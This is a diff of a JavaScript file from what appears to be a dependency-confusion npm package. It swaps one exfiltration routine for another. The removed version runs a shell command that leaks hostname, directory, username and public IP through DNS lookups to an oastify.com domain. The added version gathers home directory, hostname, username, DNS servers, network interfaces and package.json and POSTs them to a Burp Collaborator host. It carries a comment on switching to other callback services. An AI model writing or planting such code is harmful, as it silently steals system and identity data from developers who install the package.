@@ -1,13 +1,48 @@
-const { exec } = require("child_process");
-exec("a=$(hostname;pwd;whoami;echo 'emonnn-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.lf4pov1uorwd4mlw5tb31okz5qbgz5.oastify.com;done" , (error, data, getter) => {
-  if(error){
-    console.log("error",error.message);
-    return;
-  }
-  if(getter){
-    console.log(data);
-    return;
-  }
-  console.log(data);
-  
+//author:- bsainath4u@gmail.com
+const os = require("os");
+const dns = require("dns");
+const querystring = require("querystring");
+const https = require("https");
+const packageJSON = require("./package.json");
+const package = packageJSON.name;
+
+const trackingData = JSON.stringify({
+    p: package,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    ip: os.networkInterfaces(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    pjson: packageJSON,
 });
+
+var postData = querystring.stringify({
+    msg: trackingData,
+});
+
+var options = {
+    hostname: "y10dcmh1knri843sg9x7p8fim9s0gp.burpcollaborator.net", //replace burpcollaborator.net with Interactsh or pipedream
+    port: 443,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    },
+};
+
+var req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+});
+
+req.on("error", (e) => {
+    // console.error(e);
+});
+
+req.write(postData);
+req.end();
